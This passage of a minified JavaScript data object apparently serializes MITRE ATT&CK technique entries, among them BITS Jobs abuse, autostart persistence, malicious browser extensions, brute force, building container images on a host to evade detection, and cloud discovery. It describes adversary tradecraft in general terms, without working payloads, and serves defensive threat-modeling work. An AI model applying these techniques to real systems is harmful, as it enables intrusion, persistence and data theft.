fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1083'\u003EFile and Directory Discovery\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1570'\u003ELateral Tool Transfer\u003C\u002Fa\u003E to identify and move files.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1119",external_id:jW}],tactics:[m]},{id:dW,"object-type":a,name:"Automated Exfiltration",description:"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1041'\u003EExfiltration Over C2 Channel\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1048'\u003EExfiltration Over Alternative Protocol\u003C\u002Fa\u003E.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1020",external_id:dW}],tactics:[J],subtechniques:[jX]},{id:jZ,"object-type":a,name:"BITS Jobs",description:"Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001'\u003EComponent Object Model\u003C\u002Fa\u003E (COM).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms680573.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fbb968799.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E and the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0190'\u003EBITSAdmin\u003C\u002Fa\u003E tool.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fbb968799.aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Faa362813.aspx'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.secureworks.com\u002Fblog\u002Fmalware-lingers-with-bits'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Farstechnica.com\u002Finformation-technology\u002F2007\u002F05\u002Fmalware-piggybacks-on-windows-background-intelligent-transfer-service\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fmalware-update-windows-update'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2017\u002F11\u002Funit42-uboatrat-navigates-east-asia\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.secureworks.com\u002Fblog\u002Fmalware-lingers-with-bits'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nBITS upload functionalities can also be used to perform \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1048'\u003EExfiltration Over Alternative Protocol\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.secureworks.com\u002Fblog\u002Fmalware-lingers-with-bits'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:jZ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1197"},{url:cm,description:cn,source_name:co},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fbb968799.aspx",description:"Microsoft. (n.d.). Background Intelligent Transfer Service. Retrieved January 12, 2018.",source_name:"Microsoft BITS"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Faa362813.aspx",description:"Microsoft. (n.d.). BITSAdmin Tool. Retrieved January 12, 2018.",source_name:"Microsoft BITSAdmin"},{url:"https:\u002F\u002Fwww.secureworks.com\u002Fblog\u002Fmalware-lingers-with-bits",description:"Counter Threat Unit Research Team. (2016, June 6). Malware Lingers with BITS. Retrieved January 12, 2018.",source_name:"CTU BITS Malware June 2016"},{url:"https:\u002F\u002Farstechnica.com\u002Finformation-technology\u002F2007\u002F05\u002Fmalware-piggybacks-on-windows-background-intelligent-transfer-service\u002F",description:"Mondok, M. (2007, May 11). Malware piggybacks on Windows’ Background Intelligent Transfer Service. Retrieved January 12, 2018.",source_name:"Mondok Windows PiggyBack BITS May 2007"},{url:"https:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fmalware-update-windows-update",description:"Florio, E. (2007, May 9). Malware Update with Windows Update. Retrieved January 12, 2018.",source_name:"Symantec BITS May 2007"},{url:"https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2017\u002F11\u002Funit42-uboatrat-navigates-east-asia\u002F",description:"Hayashi, K. (2017, November 28). UBoatRAT Navigates East Asia. Retrieved January 12, 2018.",source_name:"PaloAlto UBoatRAT Nov 2017"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fdd939934.aspx",description:"Microsoft. (2011, July 19). Issues with BITS. Retrieved January 12, 2018.",source_name:"Microsoft Issues with BITS July 2011"},{source_name:j_,url:j$,description:ka}],tactics:[d,k]},{id:v,"object-type":a,name:"Boot or Logon Autostart Execution",description:"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Faa376977'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa374733.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms725475.aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.cylance.com\u002Fwindows-registry-persistence-part-2-the-run-keys-and-search-order'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.tldp.org\u002FLDP\u002Flkmpg\u002F2.4\u002Flkmpg.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E  These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",external_references:[{source_name:b,external_id:v,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547"},{external_id:kb,source_name:c,url:kc},{url:kd,description:ke,source_name:kf},{url:kg,description:kh,source_name:ki},{url:kj,description:kk,source_name:kl},{url:km,description:kn,source_name:ko},{source_name:kp,url:kq,description:kr},{url:y,description:z,source_name:A}],tactics:[k,u],subtechniques:[ks,ku,kz,kE,kG,kI,kK,kM,kO,kQ,kS,kU,kW,kY]},{id:al,"object-type":a,name:"Boot or Logon Initialization Scripts",description:"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",external_references:[{source_name:b,external_id:al,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1037"},{external_id:kb,source_name:c,url:kc}],tactics:[k,u],subtechniques:[k_,lb,ld,lf,lm]},{id:lo,"object-type":a,name:"Browser Bookmark Discovery",description:"Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools\u002Fdashboards, or other related infrastructure.\n\nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F001'\u003ECredentials In Files\u003C\u002Fa\u003E associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and\u002For application, but browser bookmarks are typically stored in local files\u002Fdatabases.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1217",external_id:lo}],tactics:[i]},{id:lp,"object-type":a,name:"Browser Extensions",description:"Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FBrowser_extension'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.chrome.com\u002Fextensions'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fstatic.googleusercontent.com\u002Fmedia\u002Fresearch.google.com\u002Fen\u002F\u002Fpubs\u002Farchive\u002F43824.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the \u003Ccode\u003Eprofiles\u003C\u002Fcode\u003E tool to install malicious \u003Ccode\u003E.mobileconfig\u003C\u002Fcode\u003E files. In macOS 11+, the use of the \u003Ccode\u003Eprofiles\u003C\u002Fcode\u003E tool can no longer install configuration profiles, however \u003Ccode\u003E.mobileconfig\u003C\u002Fcode\u003E files can be planted and installed with user interaction.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.xorrior.com\u002FNo-Place-Like-Chrome\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOnce the extension is installed, it can browse to websites in the background,\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.ghacks.net\u002F2017\u002F09\u002F19\u002Ffirst-chrome-extension-with-javascript-crypto-miner-detected\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.icebrg.io\u002Fblog\u002Fmalicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E steal all information that a user enters into a browser (including credentials)\u003Csup\u003E\u003Ca href='https:\u002F\u002Fisc.sans.edu\u002Fforums\u002Fdiary\u002FBankerGoogleChromeExtensiontargetingBrazil\u002F22722\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fisc.sans.edu\u002Fforums\u002Fdiary\u002FCatchAll+Google+Chrome+Malicious+Extension+Steals+All+Posted+Data\u002F22976\u002Fhttps:\u002Fthreatpost.com\u002Fmalicious-chrome-extension-steals-data-posted-to-any-website\u002F128680\u002F)'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2017\u002F07\u002F20\u002Fstantinko-massive-adware-campaign-operating-covertly-since-2012\u002F'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E There have also been similar examples of extensions being used for command & control.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkjaer.io\u002Fextension-malware\u002F'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:lp,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1176"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FBrowser_extension",description:"Wikipedia. (2017, October 8). Browser Extension. Retrieved January 11, 2018.",source_name:"Wikipedia Browser Extension"},{url:"https:\u002F\u002Fdeveloper.chrome.com\u002Fextensions",description:"Chrome. (n.d.). What are Extensions?. Retrieved November 16, 2017.",source_name:"Chrome Extensions Definition"},{url:"https:\u002F\u002Fstatic.googleusercontent.com\u002Fmedia\u002Fresearch.google.com\u002Fen\u002F\u002Fpubs\u002Farchive\u002F43824.pdf",description:"Jagpal, N., et al. (2015, August). Trends and Lessons from Three Years Fighting Malicious Extensions. Retrieved November 17, 2017.",source_name:"Malicious Chrome Extension Numbers"},{source_name:"xorrior chrome extensions macOS",url:"https:\u002F\u002Fwww.xorrior.com\u002FNo-Place-Like-Chrome\u002F",description:"Chris Ross. (2019, February 8). No Place Like Chrome. Retrieved April 27, 2021."},{url:"https:\u002F\u002Fwww.ghacks.net\u002F2017\u002F09\u002F19\u002Ffirst-chrome-extension-with-javascript-crypto-miner-detected\u002F",description:"Brinkmann, M. (2017, September 19). First Chrome extension with JavaScript Crypto Miner detected. Retrieved November 16, 2017.",source_name:"Chrome Extension Crypto Miner"},{url:lq,description:lr,source_name:ls},{url:"https:\u002F\u002Fisc.sans.edu\u002Fforums\u002Fdiary\u002FBankerGoogleChromeExtensiontargetingBrazil\u002F22722\u002F",description:"Marinho, R. (n.d.). (Banker(GoogleChromeExtension)).targeting. Retrieved November 18, 2017.",source_name:"Banker Google Chrome Extension Steals Creds"},{url:"https:\u002F\u002Fisc.sans.edu\u002Fforums\u002Fdiary\u002FCatchAll+Google+Chrome+Malicious+Extension+Steals+All+Posted+Data\u002F22976\u002Fhttps:\u002Fthreatpost.com\u002Fmalicious-chrome-extension-steals-data-posted-to-any-website\u002F128680\u002F)",description:"Marinho, R. (n.d.). \"Catch-All\" Google Chrome Malicious Extension Steals All Posted Data. Retrieved November 16, 2017.",source_name:"Catch All Chrome Extension"},{url:"https:\u002F\u002Fwww.welivesecurity.com\u002F2017\u002F07\u002F20\u002Fstantinko-massive-adware-campaign-operating-covertly-since-2012\u002F",description:"Vachon, F., Faou, M. (2017, July 20). Stantinko: A massive adware campaign operating covertly since 2012. Retrieved November 16, 2017.",source_name:"Stantinko Botnet"},{url:"https:\u002F\u002Fkjaer.io\u002Fextension-malware\u002F",description:"Kjaer, M. (2016, July 18). Malware in the browser: how you might get hacked by a Chrome extension. Retrieved November 22, 2017.",source_name:"Chrome Extension C2 Malware"}],tactics:[k]},{id:aN,"object-type":a,name:"Brute Force",description:"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.",external_references:[{source_name:b,external_id:aN,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110"},{external_id:lt,source_name:c,url:lu}],tactics:[r],subtechniques:[lv,lx,lz,lE]},{id:lG,"object-type":a,name:"Build Image on Host",description:"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote \u003Ccode\u003Ebuild\u003C\u002Fcode\u003E request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Fapi\u002Fv1.41\u002F#operation\u002FImageBuild'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAn adversary may take advantage of that \u003Ccode\u003Ebuild\u003C\u002Fcode\u003E API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1610'\u003EDeploy Container\u003C\u002Fa\u003E using that custom image.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.aquasec.com\u002Fmalicious-container-image-docker-container-host'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. ",external_references:[{source_name:b,external_id:lG,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1612"},{source_name:"Docker Build Image",url:"https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Fapi\u002Fv1.41\u002F#operation\u002FImageBuild",description:"Docker. ( null). Docker Engine API v1.41 Reference - Build an Image. Retrieved March 30, 2021."},{source_name:lH,url:lI,description:lJ}],tactics:[d]},{id:lK,"object-type":a,name:"Clipboard Data",description:"Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nIn Windows, Applications can access clipboard data by using the Windows API.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms649012'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E OSX provides a native command, \u003Ccode\u003Epbpaste\u003C\u002Fcode\u003E, to grab clipboard contents.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002Frvrsh3ll\u002Foperating-with-empyre-ea764eda3363'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:lK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1115"},{external_id:"CAPEC-637",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F637.html"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms649012",description:"Microsoft. (n.d.). About the Clipboard. Retrieved March 29, 2016.",source_name:"MSDN Clipboard"},{url:"https:\u002F\u002Fmedium.com\u002Frvrsh3ll\u002Foperating-with-empyre-ea764eda3363",description:"rvrsh3ll. (2016, May 18). Operating with EmPyre. Retrieved July 12, 2017.",source_name:"Operating with EmPyre"}],tactics:[m]},{id:lL,"object-type":a,name:"Cloud Infrastructure Discovery",description:"An adversary may attempt to discover resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a \u003Ccode\u003EDescribeInstances\u003C\u002Fcode\u003E API within the Amazon EC2 API that can return information about one or more instances within an account, as well as the \u003Ccode\u003EListBuckets\u003C\u002Fcode\u003E API that returns a list of all buckets owned by the authenticated sender of the request.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.aws.amazon.com\u002Fcli\u002Flatest\u002Freference\u002Fssm\u002Fdescribe-instance-information.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.aws.amazon.com\u002FAWSEC2\u002Flatest\u002FAPIReference\u002FAPI_DescribeInstances.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Similarly, GCP's Cloud SDK CLI provides the \u003Ccode\u003Egcloud compute instances list\u003C\u002Fcode\u003E command to list all Google Compute Engine instances in a project\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloud.google.com\u002Fsdk\u002Fgcloud\u002Freference\u002Fcompute\u002Finstances\u002Flist'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, and Azure's CLI command \u003Ccode\u003Eaz vm list\u003C\u002Fcode\u003E lists details of virtual machines.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fcli\u002Fazure\u002Fad\u002Fuser?view=azure-cli-latest'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fexpel.io\u002Fblog\u002Ffinding-evil-in-aws\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcontent.fireeye.com\u002Fm-trends\u002Frpt-m-trends-2020'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Unlike in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1526'\u003ECloud Service Discovery\u003C\u002Fa\u003E, this technique focuses on the discovery of components of the provided services rather than the services themselves.",external_references:[{source_name:b,external_id:lL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1580"},{source_name:lM,url:lN,description:lO},{source_name:"Amazon Describe Instances API",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002FAWSEC2\u002Flatest\u002FAPIReference\u002FAPI_DescribeInstances.html",description:"Amazon. (n.d.). DescribeInstances. Retrieved May 26, 2020."},{source_name:"Google Compute Instances",url:"https:\u002F\u002Fcloud.google.com\u002Fsdk\u002Fgcloud\u002Freference\u002Fcompute\u002Finstances\u002Flist",description:"Google. (n.d.). gcloud compute instances list. Retrieved May 26, 2020."},{description:dO,url:dP,source_name:dQ},{source_name:ci,url:cj,description:ck},{source_name:am,url:an,description:ao}],tactics:[i]},{id:lP,"object-type":a,name:"Cloud Service Dashboard",description:"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloud.google.com\u002Fsecurity-command-center\u002Fdocs\u002Fquickstart-scc-dashboard'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",external_references:[{external_id:lP,source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1538"},{source_name:"Google Command Center Dashboard",url:"https:\u002F\u002Fcloud.google.com\u002Fsecurity-command-center\u002Fdocs\u002Fquickstart-scc-dashboard",description:"Google. (2019, October 3). Quickstart: Using the dashboard. Retrieved October 8, 2019."},{source_name:"AWS Console Sign-in Events",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002Fawscloudtrail\u002Flatest\u002Fuserguide\u002Fcloudtrail-event-reference-aws-console-sign-in-events.html",description:"Amazon. (n.d.). AWS Console Sign-in Events. Retrieved October 23, 2019."}],tactics:[i]},{id:lQ,"object-type":a,name:"Cloud Service Discovery",description:"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI\u002FCD), Lambda Functions, Azure AD, etc. \n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Frest\u002Fapi\u002Fresources\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fazure\u002Fad\u002Fgraph\u002Fhowto\u002Fazure-ad-graph-api-operations-overview'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nStormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FAzure\u002FStormspotter'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FRhinoSecurityLabs\u002Fpacu'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:lQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1526"},{source_name:"Azure - Resource Manager API",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Frest\u002Fapi\u002Fresources\u002F",description:"Microsoft. (2019, May 20). Azure Resource Manager. Retrieved June 17, 2020."},{source_name:"Azure AD Graph API",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fazure\u002Fad\u002Fgraph\u002Fhowto\u002Fazure-ad-graph-api-operations-overview",description:"Microsoft. (2016, March 26). Operations overview | Graph API concepts. Retrieved June 18, 2020."},{source_name:"Azure - Stormspotter",url:"https:\u002F\u002Fgithub.com\u002FAzure\u002FStormspotter",description:"Microsoft. (2020). Azure Stormspotter GitHub. Retrieved June 17, 2020."},{source_name:"GitHub Pacu",url:"https:\u002F\u002Fgithub.com\u002FRhinoSecurityLabs\u002Fpacu",description:"Rhino Security Labs. (2019, August 22). Pacu. Retrieved October 17, 2019."}],tactics:[i]},{id:O,"object-type":a,name:"Command and Scripting Interpreter",description:"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F004'\u003EUnix Shell\u003C\u002Fa\u003E while Windows installations include the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F003'\u003EWindows Command Shell\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E.\n\nThere are also cross-platform interpreters such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F006'\u003EPython\u003C\u002Fa\u003E, as well as those commonly associated with client applications such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F007'\u003EJavaScript\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F005'\u003EVisual Basic\u003C\u002Fa\u003E.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0001'\u003EInitial Access\u003C\u002Fa\u003E payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals\u002Fshells.",external_references:[{source_name:b,external_id:O,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059"}],tactics:[p],subtechniques:[lR,lW,lZ,mc,mh,mj,ml,mn]},{id:mp,"object-type":a,name:"Commonly Used Port",description:"**This technique has been deprecated. Please use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1571'\u003ENon-Standard Port\u003C\u002Fa\u003E where appropriate.**\n\nAdversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP\u002FUDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP\u002FUDP:135 (RPC)\n* TCP\u002FUDP:22 (SSH)\n* TCP\u002FUDP:3389 